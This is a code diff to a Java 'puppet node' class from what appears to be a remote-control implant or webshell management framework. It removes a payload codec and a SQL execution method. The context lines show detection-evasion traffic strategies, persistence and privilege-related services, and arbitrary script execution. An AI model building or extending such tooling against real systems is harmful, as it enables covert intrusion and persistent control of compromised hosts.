@@ -9,7 +9,6 @@ import org.leo.core.net.layer.ResponseLayer;
 import org.leo.core.net.layer.UrlStrategy;
 import org.leo.core.net.layer.PaddingStrategy;
 import org.leo.core.net.layer.HeaderNoiseStrategy;
-import org.leo.core.payload.PayloadCodec;
 import org.leo.core.puppet.AbstractPuppetNode;
 import org.leo.core.puppet.capability.BasicInfoCapable;
 import org.leo.core.puppet.capability.WebRuntimeManageCapable;
@@ -107,7 +106,6 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     private volatile Consumer<String> hostIdChangeListener = ignored -> { };
 
     private Communication communication;
-    private PayloadCodec payloadCodec;
     private final NetworkProxyManager networkProxyManager = new NetworkProxyManager(this);
 
     /** per-puppet URL 随机化策略 */
@@ -129,11 +127,6 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     public void setCommunication(Communication communication) {
         this.communication = communication;
 
-    }
-
-    public void setPayloadCodec(PayloadCodec payloadCodec) {
-        this.payloadCodec = payloadCodec;
-        serviceRegistry.setPayloadCodec(payloadCodec);
     }
 
 
@@ -202,7 +195,6 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
                 firewallService, networkShareService, installedSoftwareService,
                 dockerContainerService, suidCapabilityService,
                 persistenceService, networkConnectionService);
-        serviceRegistry.setPayloadCodec(payloadCodec);
         serviceRegistry.setHostIdMismatchRecovery(this::recoverHostAffinity);
 
         if (hostId != null) {
@@ -576,12 +568,6 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     @Override
     public Map<String, Object> execScript(String language, String script) throws Exception {
         return execScriptService.execScript(language, script);
-    }
-
-    @Override
-    public Map<String, Object> executeSql(org.leo.core.puppet.database.DatabaseConnectionSpec connection,
-                                          String sqlScript) throws Exception {
-        return sqlService.executeSql(connection, sqlScript);
     }
 
     @Override
